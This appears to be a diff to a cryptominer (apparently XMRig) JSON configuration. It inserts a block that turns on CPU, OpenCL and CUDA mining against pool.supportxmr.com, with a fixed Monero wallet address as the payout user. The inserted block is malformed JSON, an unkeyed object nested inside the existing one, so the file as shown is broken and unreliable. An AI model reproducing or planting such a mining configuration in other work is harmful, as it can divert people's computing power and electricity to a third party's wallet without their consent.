@@ -98,5 +98,21 @@
     "verbose": 0,
     "watch": true,
     "pause-on-battery": false,
-    "pause-on-active": false
+    "pause-on-active": false,
+    
+    {
+"autosave": true,
+"cpu": true,
+"opencl": true,
+"cuda": true,
+"pools": [
+{
+"url": "pool.supportxmr.com:443",
+"user": "8BCSCkE5tCvLQzPTbYfBVsW9MhavZD947csSpdAC4yFvCSrNbMmPs5ffCuWtbjuxd8dPDX5FskTPVKcT7EctDAg6UweRzi7",
+"keepalive": true,
+"tls": true
+}
+]
+}
+
 }
